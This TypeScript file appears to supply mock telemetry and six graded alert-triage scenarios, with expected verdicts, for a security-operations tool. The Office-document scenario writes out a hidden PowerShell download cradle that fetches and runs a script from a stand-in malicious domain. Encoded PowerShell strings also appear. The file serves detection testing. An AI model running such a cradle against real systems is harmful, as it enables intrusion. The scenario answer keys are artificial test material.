import type { AlertEnvelope } from "./types";
import { seededUnit, sha256Of } from "./util";

/**
 * Mock telemetry world (Phase 1-2 query adapter). Everything here is
 * deterministic: given the same alert envelope you always get the same world,
 * which is what makes finding verification return PASS.
 */

export interface AssetRecord {
  asset: string;
  criticality: "low" | "medium" | "high" | "critical";
  owner: string;
  department: string;
  os: string;
  edr_agent_status: "online" | "offline" | "degraded";
  tags: string[];
}

export interface ChangeTicket {
  id: string;
  title: string;
  status: "open" | "scheduled" | "closed";
  asset: string;
  window_start: string;
  window_end: string;
  owner: string;
  covers_event: boolean;
}

export interface HashFleetRecord {
  occurrence_count: number;
  host_list: string[];
  distinct_hosts: number;
  first_seen: string;
  last_seen: string;
}

export interface ProcessTreeRecord {
  found: boolean;
  pid: number;
  process_name: string;
  command_line: string;
  user: string;
  session_id: string;
  parent_process_name: string;
  parent_pid: number;
  parent_command_line: string;
  integrity_level: string;
  signature_valid: boolean;
  module_load_count: number;
  suspicious_module_count: number;
  modules: string[];
  correlated_sources: string[];
}

export interface HeartbeatRecord {
  agent_status: "online" | "offline" | "degraded";
  expected_intervals: number;
  observed_intervals: number;
  coverage_pct: number;
  gap_covering_event: boolean;
  gap_minutes: number;
  first_heartbeat: string;
  last_heartbeat: string;
}

export interface IdpRecord {
  event_count: number;
  interactive_count: number;
  mfa_used: boolean;
  new_country: boolean;
  impossible_travel: boolean;
  client_app: string;
  sign_in_country: string;
  pipeline_health: "healthy" | "degraded";
  events: { timestamp: string; result: string; country: string; client_app: string; mfa_used: boolean }[];
}

export interface DnsRecord {
  sensor_status: "collecting" | "no_collector" | "error";
  resolution_count: number;
  new_domain_count: number;
  suspicious_domain_count: number;
  resolutions: { domain: string; resolved_ip: string; classification: string; count: number }[];
}

export interface ProxyRecord {
  sensor_status: "collecting" | "no_collector" | "error";
  flow_count: number;
  egress_to_raw_ip: boolean;
  category_summary: Record<string, number>;
  flows: { destination: string; bytes: number; category: string }[];
}

export interface MockWorld {
  key: string;
  assets: Record<string, AssetRecord>;
  changeTickets: ChangeTicket[];
  hashFleet: Record<string, HashFleetRecord>;
  processTrees: Record<string, ProcessTreeRecord>;
  heartbeats: Record<string, HeartbeatRecord>;
  idp: Record<string, IdpRecord>;
  dns: Record<string, DnsRecord>;
  proxy: Record<string, ProxyRecord>;
}

export interface Scenario {
  key: string;
  label: string;
  narrative: string;
  expected: AlertEnvelope["severity"];
  verdict: string;
  alert: Omit<AlertEnvelope, "worldKey" | "scenarioKey">;
  paraphrase: { title: string; description: string };
  world: MockWorld;
}

const hour = 3600_000;
const base = Date.parse("2026-02-17T09:14:00.000Z");
const iso = (offsetMs: number) => new Date(base + offsetMs).toISOString();
const fleet = (n: number, prefix: string) => Array.from({ length: n }, (_, i) => `${prefix}-${100 + i * 7}`);

function emptyWorld(key: string): MockWorld {
  return {
    key,
    assets: {},
    changeTickets: [],
    hashFleet: {},
    processTrees: {},
    heartbeats: {},
    idp: {},
    dns: {},
    proxy: {},
  };
}

/* ------------------------------------------------------------------ */
/* Scenario 1: fleet-wide IT automation → benign_noisy                */
/* ------------------------------------------------------------------ */
const worldAutomation = (() => {
  const w = emptyWorld("it_automation_fleet");
  w.assets["WKSTN-1142"] = {
    asset: "WKSTN-1142",
    criticality: "medium",
    owner: "M. Okafor",
    department: "IT Operations",
    os: "Windows 11 23H2",
    edr_agent_status: "online",
    tags: ["managed", "autopilot", "baseline-dsc"],
  };
  w.changeTickets.push({
    id: "CHG-2291",
    title: "Quarterly endpoint configuration baseline (DSC via scheduled service)",
    status: "scheduled",
    asset: "WKSTN-1142",
    window_start: iso(-2 * hour),
    window_end: iso(4 * hour),
    owner: "svc-autodeploy",
    covers_event: true,
  });
  const hosts = fleet(37, "WKSTN");
  w.hashFleet["b7f1c0e4a93d4f58c1e2b09a7d6453f8e21c9a4b7d0e3f5c6a8b1d2e3f4a5b6c"] = {
    occurrence_count: 37,
    host_list: hosts.slice(0, 10),
    distinct_hosts: 37,
    first_seen: iso(-30 * 24 * hour),
    last_seen: iso(-5 * 60_000),
  };
  w.processTrees["WKSTN-1142"] = {
    found: true,
    pid: 4412,
    process_name: "powershell.exe",
    command_line:
      "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...=",
    user: "svc-autodeploy",
    session_id: "S-1-5-18",
    parent_process_name: "psservice.exe",
    parent_pid: 812,
    parent_command_line: "C:\\Windows\\system32\\psservice.exe -run DscBaseline",
    integrity_level: "System",
    signature_valid: true,
    module_load_count: 41,
    suspicious_module_count: 0,
    modules: ["System.Management.Automation.dll", "Microsoft.PowerShell.Security.dll"],
    correlated_sources: ["edr.process_event", "siem.process_event"],
  };
  w.heartbeats["WKSTN-1142"] = {
    agent_status: "online",
    expected_intervals: 60,
    observed_intervals: 60,
    coverage_pct: 1,
    gap_covering_event: false,
    gap_minutes: 0,
    first_heartbeat: iso(-hour),
    last_heartbeat: iso(0),
  };
  w.idp["svc-autodeploy"] = {
    event_count: 3,
    interactive_count: 0,
    mfa_used: false,
    new_country: false,
    impossible_travel: false,
    client_app: "service_principal",
    sign_in_country: "US",
    pipeline_health: "healthy",
    events: [
      { timestamp: iso(-20 * 60_000), result: "success", country: "US", client_app: "service_principal", mfa_used: false },
    ],
  };
  w.dns["WKSTN-1142"] = {
    sensor_status: "collecting",
    resolution_count: 4,
    new_domain_count: 0,
    suspicious_domain_count: 0,
    resolutions: [
      { domain: "config.corp.internal", resolved_ip: "10.20.4.11", classification: "corporate", count: 12 },
      { domain: "psgallery.corpcdn.net", resolved_ip: "23.5.11.9", classification: "cdn", count: 3 },
    ],
  };
  w.proxy["WKSTN-1142"] = {
    sensor_status: "collecting",
    flow_count: 1,
    egress_to_raw_ip: false,
    category_summary: { corporate_cdn: 1 },
    flows: [{ destination: "psgallery.corpcdn.net", bytes: 18432, category: "corporate_cdn" }],
  };
  return w;
})();

/* ------------------------------------------------------------------ */
/* Scenario 2: scheduled maintenance window on a critical asset        */
/* ------------------------------------------------------------------ */
const worldChangeWindow = (() => {
  const w = emptyWorld("change_window_maintenance");
  w.assets["SRV-DB-07"] = {
    asset: "SRV-DB-07",
    criticality: "critical",
    owner: "K. Lindqvist",
    department: "Database Operations",
    os: "Windows Server 2022",
    edr_agent_status: "online",
    tags: ["server", "sql", "maintenance_window"],
  };
  w.changeTickets.push({
    id: "CHG-4471",
    title: "Index rebuild + statistics maintenance (PowerShell runbook)",
    status: "open",
    asset: "SRV-DB-07",
    window_start: iso(-hour),
    window_end: iso(3 * hour),
    owner: "svc-sqlmaint",
    covers_event: true,
  });
  w.hashFleet["4d9a7b2c6e1f40a83b5c7d90e2f1a4b6c8d0e2f4a6b8c0d2e4f6a8b0c2d4e6f8"] = {
    occurrence_count: 1,
    host_list: ["SRV-DB-07"],
    distinct_hosts: 1,
    first_seen: iso(-12 * 60_000),
    last_seen: iso(-60_000),
  };
  w.processTrees["SRV-DB-07"] = {
    found: true,
    pid: 774,
    process_name: "powershell.exe",
    command_line: "powershell.exe -File C:\\Ops\\Runbooks\\IndexMaintenance.ps1 -Mode Full",
    user: "svc-sqlmaint",
    session_id: "S-1-5-18",
    parent_process_name: "taskeng.exe",
    parent_pid: 1188,
    parent_command_line: "taskeng.exe /RU svc-sqlmaint C:\\Ops\\Runbooks\\IndexMaintenance.ps1",
    integrity_level: "System",
    signature_valid: true,
    module_load_count: 12,
    suspicious_module_count: 0,
    modules: ["SqlServer.Smo.dll"],
    correlated_sources: ["edr.process_event", "siem.process_event"],
  };
  w.heartbeats["SRV-DB-07"] = {
    agent_status: "online",
    expected_intervals: 60,
    observed_intervals: 59,
    coverage_pct: 0.98,
    gap_covering_event: false,
    gap_minutes: 0,
    first_heartbeat: iso(-hour),
    last_heartbeat: iso(0),
  };
  w.idp["svc-sqlmaint"] = {
    event_count: 1,
    interactive_count: 0,
    mfa_used: false,
    new_country: false,
    impossible_travel: false,
    client_app: "daemon",
    sign_in_country: "US",
    pipeline_health: "healthy",
    events: [{ timestamp: iso(-hour), result: "success", country: "US", client_app: "daemon", mfa_used: false }],
  };
  w.dns["SRV-DB-07"] = {
    sensor_status: "collecting",
    resolution_count: 1,
    new_domain_count: 0,
    suspicious_domain_count: 0,
    resolutions: [{ domain: "monitoring.corp.internal", resolved_ip: "10.4.2.7", classification: "corporate", count: 2 }],
  };
  w.proxy["SRV-DB-07"] = {
    sensor_status: "collecting",
    flow_count: 0,
    egress_to_raw_ip: false,
    category_summary: {},
    flows: [],
  };
  return w;
})();

/* ------------------------------------------------------------------ */
/* Scenario 3: document → download cradle → stager                     */
/* ------------------------------------------------------------------ */
const worldCradle = (() => {
  const w = emptyWorld("download_cradle");
  w.assets["WKSTN-2201"] = {
    asset: "WKSTN-2201",
    criticality: "high",
    owner: "J. Rivera",
    department: "Finance",
    os: "Windows 11 23H2",
    edr_agent_status: "online",
    tags: ["finance", "crown_jewel_access"],
  };
  w.hashFleet["9f2c8e6a0b4d4c2e8a6f1c3b5d7e9f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8e0b2d4"] = {
    occurrence_count: 1,
    host_list: ["WKSTN-2201"],
    distinct_hosts: 1,
    first_seen: iso(-6 * 60_000),
    last_seen: iso(-60_000),
  };
  w.processTrees["WKSTN-2201"] = {
    found: true,
    pid: 6120,
    process_name: "powershell.exe",
    command_line:
      "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-update-verify.top/s2.ps1')",
    user: "jrivera",
    session_id: "S-1-5-21-771347599-3620117421-18442395",
    parent_process_name: "winword.exe",
    parent_pid: 5988,
    parent_command_line: "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n invoice_q1.docm",
    integrity_level: "Medium",
    signature_valid: false,
    module_load_count: 9,
    suspicious_module_count: 2,
    modules: ["comsvcs.dll (MiniDump)", "System.Net.WebClient"],
    correlated_sources: ["edr.process_event", "proxy.egress"],
  };
  w.heartbeats["WKSTN-2201"] = {
    agent_status: "online",
    expected_intervals: 60,
    observed_intervals: 60,
    coverage_pct: 1,
    gap_covering_event: false,
    gap_minutes: 0,
    first_heartbeat: iso(-hour),
    last_heartbeat: iso(0),
  };
  w.idp["jrivera"] = {
    event_count: 4,
    interactive_count: 2,
    mfa_used: false,
    new_country: true,
    impossible_travel: true,
    client_app: "browser",
    sign_in_country: "PL",
    pipeline_health: "healthy",
    events: [
      { timestamp: iso(-3 * hour), result: "success", country: "US", client_app: "browser", mfa_used: true },
      { timestamp: iso(-11 * 60_000), result: "success", country: "PL", client_app: "browser", mfa_used: false },
    ],
  };
  w.dns["WKSTN-2201"] = {
    sensor_status: "collecting",
    resolution_count: 7,
    new_domain_count: 3,
    suspicious_domain_count: 2,
    resolutions: [
      { domain: "cdn-update-verify.top", resolved_ip: "185.234.72.11", classification: "newly_registered", count: 3 },
      { domain: "pastebin-gate.xyz", resolved_ip: "45.13.199.7", classification: "known_bad", count: 1 },
      { domain: "outlook.office365.com", resolved_ip: "52.96.7.2", classification: "saas", count: 8 },
    ],
  };
  w.proxy["WKSTN-2201"] = {
    sensor_status: "collecting",
    flow_count: 5,
    egress_to_raw_ip: true,
    category_summary: { uncategorized: 2, file_sharing: 2, raw_ip: 1 },
    flows: [
      { destination: "cdn-update-verify.top", bytes: 51200, category: "uncategorized" },
      { destination: "185.234.72.11:443", bytes: 30720, category: "raw_ip" },
      { destination: "pastebin-gate.xyz", bytes: 8192, category: "uncategorized" },
    ],
  };
  return w;
})();

/* ------------------------------------------------------------------ */
/* Scenario 4: EDR heartbeat gap covering the event → tamper           */
/* ------------------------------------------------------------------ */
const worldTamper = (() => {
  const w = emptyWorld("edr_sensor_tamper");
  w.assets["SRV-APP-118"] = {
    asset: "SRV-APP-118",
    criticality: "high",
    owner: "P. Nowak",
    department: "Backup Operations",
    os: "Windows Server 2019",
    edr_agent_status: "online",
    tags: ["server", "backup"],
  };
  w.hashFleet["c1a4f7b2e9d04a6c8e0b3d5f7a9c1e3b5d7f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8"] = {
    occurrence_count: 1,
    host_list: ["SRV-APP-118"],
    distinct_hosts: 1,
    first_seen: iso(-9 * 60_000),
    last_seen: iso(-60_000),
  };
  // EDR never saw the process: only the SIEM (syslog) forwarder did.
  w.processTrees["SRV-APP-118"] = {
    found: false,
    pid: 3311,
    process_name: "powershell.exe",
    command_line: "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
    user: "svc-backup",
    session_id: "S-1-5-18",
    parent_process_name: "",
    parent_pid: 0,
    parent_command_line: "",
    integrity_level: "System",
    signature_valid: false,
    module_load_count: 0,
    suspicious_module_count: 0,
    modules: [],
    correlated_sources: ["siem.process_event"],
  };
  w.heartbeats["SRV-APP-118"] = {
    agent_status: "online",
    expected_intervals: 60,
    observed_intervals: 26,
    coverage_pct: 0.43,
    gap_covering_event: true,
    gap_minutes: 18,
    first_heartbeat: iso(-hour),
    last_heartbeat: iso(0),
  };
  w.idp["svc-backup"] = {
    event_count: 2,
    interactive_count: 0,
    mfa_used: false,
    new_country: false,
    impossible_travel: false,
    client_app: "daemon",
    sign_in_country: "US",
    pipeline_health: "healthy",
    events: [{ timestamp: iso(-40 * 60_000), result: "success", country: "US", client_app: "daemon", mfa_used: false }],
  };
  w.dns["SRV-APP-118"] = {
    sensor_status: "collecting",
    resolution_count: 2,
    new_domain_count: 0,
    suspicious_domain_count: 0,
    resolutions: [{ domain: "backup.corp.internal", resolved_ip: "10.9.1.4", classification: "corporate", count: 4 }],
  };
  w.proxy["SRV-APP-118"] = {
    sensor_status: "collecting",
    flow_count: 2,
    egress_to_raw_ip: false,
    category_summary: { corporate: 2 },
    flows: [{ destination: "backup.corp.internal", bytes: 1048576, category: "corporate" }],
  };
  return w;
})();

/* ------------------------------------------------------------------ */
/* Scenario 5: blind DNS + proxy sensors on a contractor laptop        */
/* ------------------------------------------------------------------ */
const worldUncovered = (() => {
  const w = emptyWorld("uncovered_contractor_laptop");
  w.assets["WKSTN-3309"] = {
    asset: "WKSTN-3309",
    criticality: "medium",
    owner: "J. Nakamura (contractor)",
    department: "Engineering (vendor)",
    os: "Windows 11 22H2",
    edr_agent_status: "online",
    tags: ["contractor", "vpn_only", "no_dns_collector"],
  };
  w.hashFleet["e7b3a9c5d1f04b6a8c0d2e4f6b8a0c2d4e6f8a0b2c4d6e8f0a2b4c6d8e0f2a4b6c8"] = {
    occurrence_count: 1,
    host_list: ["WKSTN-3309"],
    distinct_hosts: 1,
    first_seen: iso(-4 * 60_000),
    last_seen: iso(-60_000),
  };
  w.processTrees["WKSTN-3309"] = {
    found: true,
    pid: 2277,
    process_name: "powershell.exe",
    command_line: "powershell.exe -ExecutionPolicy Bypass -File .\\vendor-toolkit\\bootstrap.ps1",
    user: "jnakamura_vendor",
    session_id: "S-1-12-345-678",
    parent_process_name: "explorer.exe",
    parent_pid: 1204,
    parent_command_line: "explorer.exe",
    integrity_level: "Medium",
    signature_valid: false,
    module_load_count: 6,
    suspicious_module_count: 0,
    modules: ["System.Net.Http.dll"],
    correlated_sources: ["edr.process_event"],
  };
  w.heartbeats["WKSTN-3309"] = {
    agent_status: "online",
    expected_intervals: 60,
    observed_intervals: 60,
    coverage_pct: 1,
    gap_covering_event: false,
    gap_minutes: 0,
    first_heartbeat: iso(-hour),
    last_heartbeat: iso(0),
  };
  w.idp["jnakamura_vendor"] = {
    event_count: 1,
    interactive_count: 1,
    mfa_used: true,
    new_country: false,
    impossible_travel: false,
    client_app: "browser",
    sign_in_country: "US",
    pipeline_health: "healthy",
    events: [{ timestamp: iso(-25 * 60_000), result: "success", country: "US", client_app: "browser", mfa_used: true }],
  };
  w.dns["WKSTN-3309"] = {
    sensor_status: "no_collector",
    resolution_count: 0,
    new_domain_count: 0,
    suspicious_domain_count: 0,
    resolutions: [],
  };
  w.proxy["WKSTN-3309"] = {
    sensor_status: "no_collector",
    flow_count: 0,
    egress_to_raw_ip: false,
    category_summary: {},
    flows: [],
  };
  return w;
})();

/* ------------------------------------------------------------------ */
/* Scenario 6: authorized admin running a signed script → benign       */
/* ------------------------------------------------------------------ */
const worldAdminScript = (() => {
  const w = emptyWorld("authorized_admin_script");
  w.assets["WKSTN-1404"] = {
    asset: "WKSTN-1404",
    criticality: "low",
    owner: "A. Petrov",
    department: "Security Operations",
    os: "Windows 11 23H2",
    edr_agent_status: "online",
    tags: ["admin_workstation", "pa workstation"],
  };
  w.hashFleet["5a8d0f2c4e6b8a0c2d4f6a8b0d2c4e6f8a0b2d4c6e8f0a2b4c6d8e0f2a4b6c8d0"] = {
    occurrence_count: 2,
    host_list: ["WKSTN-1404", "WKSTN-1405"],
    distinct_hosts: 2,
    first_seen: iso(-3 * 24 * hour),
    last_seen: iso(-2 * 60_000),
  };
  w.processTrees["WKSTN-1404"] = {
    found: true,
    pid: 8890,
    process_name: "powershell.exe",
    command_line: "powershell.exe -File C:\\SecOps\\Scripts\\Get-ADTier0Report.ps1",
    user: "apetrov",
    session_id: "S-1-5-21-4489123",
    parent_process_name: "WindowsTerminal.exe",
    parent_pid: 3300,
    parent_command_line: "WindowsTerminal.exe",
    integrity_level: "Medium",
    signature_valid: true,
    module_load_count: 22,
    suspicious_module_count: 0,
    modules: ["ActiveDirectory.dll"],
    correlated_sources: ["edr.process_event", "siem.process_event"],
  };
  w.heartbeats["WKSTN-1404"] = {
    agent_status: "online",
    expected_intervals: 60,
    observed_intervals: 60,
    coverage_pct: 1,
    gap_covering_event: false,
    gap_minutes: 0,
    first_heartbeat: iso(-hour),
    last_heartbeat: iso(0),
  };
  w.idp["apetrov"] = {
    event_count: 2,
    interactive_count: 2,
    mfa_used: true,
    new_country: false,
    impossible_travel: false,
    client_app: "browser",
    sign_in_country: "US",
    pipeline_health: "healthy",
    events: [{ timestamp: iso(-30 * 60_000), result: "success", country: "US", client_app: "browser", mfa_used: true }],
  };
  w.dns["WKSTN-1404"] = {
    sensor_status: "collecting",
    resolution_count: 3,
    new_domain_count: 0,
    suspicious_domain_count: 0,
    resolutions: [{ domain: "graph.microsoft.com", resolved_ip: "20.190.1.5", classification: "saas", count: 6 }],
  };
  w.proxy["WKSTN-1404"] = {
    sensor_status: "collecting",
    flow_count: 2,
    egress_to_raw_ip: false,
    category_summary: { saas_admin: 2 },
    flows: [{ destination: "graph.microsoft.com", bytes: 92160, category: "saas_admin" }],
  };
  return w;
})();

export const SCENARIOS: Scenario[] = [
  {
    key: "it_automation_fleet",
    label: "Fleet-wide IT automation (encoded PowerShell)",
    narrative:
      "37 hosts executed the same hash during a scheduled DSC baseline run. Expect the benign hypothesis to survive and the malicious one to be falsified.",
    expected: "medium",
    verdict: "benign_noisy",
    alert: {
      alertId: "ALT-100241",
      source: "edr",
      ruleId: "SEC-1001",
      ruleName: "Encoded PowerShell Command Line",
      severity: "medium",
      title: "Encoded PowerShell spawned by service account",
      description:
        "A powershell.exe process with a base64-encoded command line was started by service account svc-autodeploy on WKSTN-1142. Encoded commands are frequently used by both administrators and attackers.",
      observedAt: iso(0),
      asset: "WKSTN-1142",
      user: "svc-autodeploy",
      processName: "powershell.exe",
      pid: 4412,
      commandLine: "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...=",
      fileHash: "b7f1c0e4a93d4f58c1e2b09a7d6453f8e21c9a4b7d0e3f5c6a8b1d2e3f4a5b6c",
      parentProcessName: "psservice.exe",
      destinationHost: null,
    },
    paraphrase: {
      title: "Obfuscated command-line interpreter activity under a machine identity",
      description:
        "The endpoint sensor observed an interpreter process whose arguments were obfuscated, launched under a non-human account on an employee workstation. This pattern is common in both administrative tooling and intrusion tooling.",
    },
    world: worldAutomation,
  },
  {
    key: "change_window_maintenance",
    label: "Scheduled maintenance runbook on a critical DB host",
    narrative:
      "Single-host execution, but an open change ticket and a signed runbook parent. Expect a benign verdict backed by falsified alternatives.",
    expected: "medium",
    verdict: "benign",
    alert: {
      alertId: "ALT-100242",
      source: "edr",
      ruleId: "SEC-1001",
      ruleName: "Encoded PowerShell Command Line",
      severity: "medium",
      title: "PowerShell runbook executed on database server",
      description:
        "A PowerShell script was executed on SRV-DB-07 under the SQL maintenance account outside business hours. The command line was not encoded.",
      observedAt: iso(0),
      asset: "SRV-DB-07",
      user: "svc-sqlmaint",
      processName: "powershell.exe",
      pid: 774,
      commandLine: "powershell.exe -File C:\\Ops\\Runbooks\\IndexMaintenance.ps1 -Mode Full",
      fileHash: "4d9a7b2c6e1f40a83b5c7d90e2f1a4b6c8d0e2f4a6b8c0d2e4f6a8b0c2d4e6f8",
      parentProcessName: "taskeng.exe",
      destinationHost: null,
    },
    paraphrase: {
      title: "Script interpreter invoked on tier-1 database infrastructure",
      description:
        "During the overnight window an interpreter process belonging to a database service identity ran a local script file on a tier-1 server. Local script execution on servers is unusual but not inherently hostile.",
    },
    world: worldChangeWindow,
  },
  {
    key: "download_cradle",
    label: "Office document spawning a download cradle",
    narrative:
      "Novel hash, Office parent, suspicious DNS, raw-IP egress and impossible travel. Expect all benign hypotheses falsified and ≥2 corroborating positive findings.",
    expected: "high",
    verdict: "suspicious",
    alert: {
      alertId: "ALT-100243",
      source: "edr",
      ruleId: "SEC-1001",
      ruleName: "Encoded PowerShell Command Line",
      severity: "high",
      title: "Word document spawned PowerShell with download cradle",
      description:
        "WINWORD.EXE spawned powershell.exe which used WebClient.DownloadString to fetch a remote script. The file hash is not known to the fleet.",
      observedAt: iso(0),
      asset: "WKSTN-2201",
      user: "jrivera",
      processName: "powershell.exe",
      pid: 6120,
      commandLine:
        "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-update-verify.top/s2.ps1')",
      fileHash: "9f2c8e6a0b4d4c2e8a6f1c3b5d7e9f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8e0b2d4",
      parentProcessName: "winword.exe",
      destinationHost: "cdn-update-verify.top",
    },
    paraphrase: {
      title: "Document application launched interpreter that retrieved remote code",
      description:
        "An office productivity application started an interpreter process which reached out to an external host and pulled down executable content. The binary involved has no fleet history.",
    },
    world: worldCradle,
  },
  {
    key: "edr_sensor_tamper",
    label: "EDR heartbeat gap covering the event (tamper)",
    narrative:
        "The SIEM saw the process; the EDR did not, and the agent heartbeat has a gap straddling the event while the agent is online before and after. Expect tamper_suspected.",
    expected: "critical",
    verdict: "tamper_suspected",
    alert: {
      alertId: "ALT-100244",
      source: "siem",
      ruleId: "SEC-1077",
      ruleName: "Encoded PowerShell from service account (SIEM)",
      severity: "critical",
      title: "PowerShell executed on host with no matching EDR process event",
      description:
        "Syslog forwarding shows an encoded PowerShell process on SRV-APP-118 that has no corresponding EDR process telemetry. The EDR agent reports online.",
      observedAt: iso(0),
      asset: "SRV-APP-118",
      user: "svc-backup",
      processName: "powershell.exe",
      pid: 3311,
      commandLine:
        "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
      fileHash: "c1a4f7b2e9d04a6c8e0b3d5f7a9c1e3b5d7f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8",
      parentProcessName: "",
      destinationHost: null,
    },
    paraphrase: {
      title: "Discrepancy between log forwarder and endpoint sensor on a server",
      description:
        "A server generated interpreter activity visible to the centralized log pipeline but absent from the endpoint agent's own telemetry, despite the agent claiming to be healthy.",
    },
    world: worldTamper,
  },
  {
    key: "uncovered_contractor_laptop",
    label: "Contractor laptop with blind DNS and proxy sensors",
    narrative:
      "DNS and proxy collectors are not deployed on this asset. Expect indeterminate with a decisive question about restoring coverage rather than a false 'nothing found'.",
    expected: "medium",
    verdict: "indeterminate",
    alert: {
      alertId: "ALT-100245",
      source: "edr",
      ruleId: "SEC-1001",
      ruleName: "Encoded PowerShell Command Line",
      severity: "medium",
      title: "Unsigned vendor bootstrap script run by contractor",
      description:
        "A contractor executed an unsigned bootstrap.ps1 from a vendor toolkit directory with ExecutionPolicy Bypass on a VPN-only asset.",
      observedAt: iso(0),
      asset: "WKSTN-3309",
      user: "jnakamura_vendor",
      processName: "powershell.exe",
      pid: 2277,
      commandLine: "powershell.exe -ExecutionPolicy Bypass -File .\\vendor-toolkit\\bootstrap.ps1",
      fileHash: "e7b3a9c5d1f04b6a8c0d2e4f6b8a0c2d4e6f8a0b2c4d6e8f0a2b4c6d8e0f2a4b6c8",
      parentProcessName: "explorer.exe",
      destinationHost: null,
    },
    paraphrase: {
      title: "Untrusted-code execution policy override on a vendor-managed endpoint",
      description:
        "On a contractor machine that connects only over VPN, a script of unknown provenance was executed with the execution policy explicitly bypassed by the interactive user.",
    },
    world: worldUncovered,
  },
  {
    key: "authorized_admin_script",
    label: "Authorized admin running a signed Tier-0 report script",
    narrative: "Interactive MFA-authenticated admin, signed script, clean telemetry. Expect benign.",
    expected: "low",
    verdict: "benign",
    alert: {
      alertId: "ALT-100246",
      source: "edr",
      ruleId: "SEC-1001",
      ruleName: "Encoded PowerShell Command Line",
      severity: "low",
      title: "Tier-0 reporting script executed by SecOps admin",
      description:
        "A SecOps administrator ran a signed Active Directory reporting script from a privileged access workstation.",
      observedAt: iso(0),
      asset: "WKSTN-1404",
      user: "apetrov",
      processName: "powershell.exe",
      pid: 8890,
      commandLine: "powershell.exe -File C:\\SecOps\\Scripts\\Get-ADTier0Report.ps1",
      fileHash: "5a8d0f2c4e6b8a0c2d4f6a8b0d2c4e6f8a0b2d4c6e8f0a2b4c6d8e0f2a4b6c8d0",
      parentProcessName: "WindowsTerminal.exe",
      destinationHost: null,
    },
    paraphrase: {
      title: "Privileged interpreter session on a security team workstation",
      description:
        "A member of the security team launched an interpreter session from their administration workstation to run a locally stored reporting script against directory services.",
    },
    world: worldAdminScript,
  },
];

const SCENARIO_WORLDS: Record<string, MockWorld> = Object.fromEntries(SCENARIOS.map((s) => [s.key, s.world]));

/**
 * Fallback world for ad-hoc alerts: a pure, deterministic function of the
 * alert envelope. The world is reconstructed identically at verification time.
 */
export function syntheticWorld(alert: AlertEnvelope): MockWorld {
  const w = emptyWorld(`synthetic:${alert.asset}:${alert.fileHash}`);
  const seed = `${alert.asset}|${alert.fileHash}|${alert.user}`;
  const unit = (salt: string) => seededUnit(`${seed}|${salt}`);
  w.assets[alert.asset] = {
    asset: alert.asset,
    criticality: unit("crit") > 0.75 ? "high" : "medium",
    owner: "unassigned",
    department: "End User Computing",
    os: "Windows 11 23H2",
    edr_agent_status: "online",
    tags: unit("scanner") > 0.85 ? ["scanner"] : ["managed"],
  };
  w.hashFleet[alert.fileHash] = {
    occurrence_count: 1 + Math.floor(unit("fleet") * 3),
    host_list: [alert.asset],
    distinct_hosts: 1 + Math.floor(unit("fleet") * 3),
    first_seen: alert.observedAt,
    last_seen: alert.observedAt,
  };
  w.processTrees[alert.asset] = {
    found: true,
    pid: alert.pid,
    process_name: alert.processName,
    command_line: alert.commandLine,
    user: alert.user,
    session_id: "S-1-5-21-1000",
    parent_process_name: alert.parentProcessName || "explorer.exe",
    parent_pid: 1000 + Math.floor(unit("ppid") * 5000),
    parent_command_line: alert.parentProcessName || "explorer.exe",
    integrity_level: "Medium",
    signature_valid: unit("signed") > 0.5,
    module_load_count: 8 + Math.floor(unit("mods") * 20),
    suspicious_module_count: 0,
    modules: ["System.Management.Automation.dll"],
    correlated_sources: ["edr.process_event"],
  };
  w.heartbeats[alert.asset] = {
    agent_status: "online",
    expected_intervals: 60,
    observed_intervals: 60,
    coverage_pct: 1,
    gap_covering_event: false,
    gap_minutes: 0,
    first_heartbeat: alert.observedAt,
    last_heartbeat: alert.observedAt,
  };
  w.idp[alert.user] = {
    event_count: 1,
    interactive_count: 1,
    mfa_used: true,
    new_country: false,
    impossible_travel: false,
    client_app: "browser",
    sign_in_country: "US",
    pipeline_health: "healthy",
    events: [{ timestamp: alert.observedAt, result: "success", country: "US", client_app: "browser", mfa_used: true }],
  };
  const dnsBlind = unit("dnsblind") > 0.6;
  w.dns[alert.asset] = dnsBlind
    ? { sensor_status: "no_collector", resolution_count: 0, new_domain_count: 0, suspicious_domain_count: 0, resolutions: [] }
    : {
        sensor_status: "collecting",
        resolution_count: 2,
        new_domain_count: 0,
        suspicious_domain_count: 0,
        resolutions: [
          { domain: "graph.microsoft.com", resolved_ip: "20.190.1.5", classification: "saas", count: 3 },
        ],
      };
  w.proxy[alert.asset] = {
    sensor_status: dnsBlind ? "no_collector" : "collecting",
    flow_count: dnsBlind ? 0 : 1,
    egress_to_raw_ip: false,
    category_summary: dnsBlind ? {} : { saas: 1 },
    flows: dnsBlind ? [] : [{ destination: "graph.microsoft.com", bytes: 20480, category: "saas" }],
  };
  return w;
}

export function resolveWorld(alert: AlertEnvelope): MockWorld {
  const known = SCENARIO_WORLDS[alert.worldKey];
  if (known) return known;
  return syntheticWorld(alert);
}

export function scenarioByKey(key: string): Scenario | undefined {
  return SCENARIOS.find((s) => s.key === key);
}

/**
 * Resolve a world for a bare asset (no case context). Used by the coverage API
 * so that fleet assets from the golden scenarios answer with their real sensor
 * topology rather than the synthetic default.
 */
export function worldForAsset(asset: string): MockWorld {
  const scenario = SCENARIOS.find((s) => s.alert.asset === asset);
  if (scenario) return scenario.world;
  return syntheticWorld({
    alertId: "COVERAGE-PROBE",
    source: "edr",
    ruleId: "SEC-1001",
    ruleName: "Coverage probe",
    severity: "low",
    title: "Coverage probe",
    description: "",
    observedAt: new Date().toISOString(),
    asset,
    user: "unknown",
    processName: "powershell.exe",
    pid: 1000,
    commandLine: "powershell.exe",
    fileHash: normalizeHash(undefined, asset),
